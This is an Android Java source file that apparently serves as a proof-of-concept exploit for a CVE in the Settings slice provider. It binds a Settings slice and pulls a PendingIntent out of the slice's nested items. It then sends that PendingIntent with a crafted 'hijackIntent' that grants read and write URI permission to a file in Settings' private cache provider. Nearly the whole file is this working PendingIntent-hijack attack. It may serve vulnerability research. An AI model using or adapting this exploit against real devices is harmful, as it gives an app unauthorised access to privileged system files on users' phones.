package com.example.sliceprovidercve;

import androidx.appcompat.app.AppCompatActivity;

import android.app.PendingIntent;
import android.app.slice.Slice;
import android.app.slice.SliceItem;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    final static String uriSettingsSlices = "content://android.settings.slices";
    final static String tag = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button =(Button) findViewById(R.id.test);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Bundle经常使用在Activity之间或者线程间传递数据
                Bundle b = new Bundle();
                // 当Bundle传递的是对象或对象数组时，必须实现Serializable或Parcelable接口
                b.putParcelable("slice_uri", Uri.parse(uriSettingsSlices));
                // 利用ContentProvider call方法实现跨进程调用
                Bundle responseBundle = getContentResolver().call(Uri.parse(uriSettingsSlices), "bind_slice", null, b);

                System.out.println(responseBundle);
                for (String key: responseBundle.keySet()) {
                    Log.i("Bundle Content", "Key=" + key + ", content:\n" +responseBundle.getParcelable(key));
                }
                Slice slice = responseBundle.getParcelable("slice");
                Slice temp1 = slice.getItems().get(0).getSlice();
                Slice temp2 = temp1.getItems().get(3).getSlice();
                PendingIntent pi = (PendingIntent) temp2.getItems().get(1).getAction();
                if(pi != null) Log.d(tag, "OK");

                Intent hijackIntent = new Intent();
                hijackIntent.setPackage(getPackageName());
                hijackIntent.setDataAndType(Uri.parse("content://com.android.settings.files/my_cache/NOTICE.html"), "txt/html");
                hijackIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION);

                assert pi != null;
                try {
                    pi.send(getApplicationContext(), 0, hijackIntent, null, null);
                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }

            }
        });

        Button button2 =(Button) findViewById(R.id.jump);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MainActivity.this, MyActivity.class);
                startActivity(intent);
            }
        });
    }
}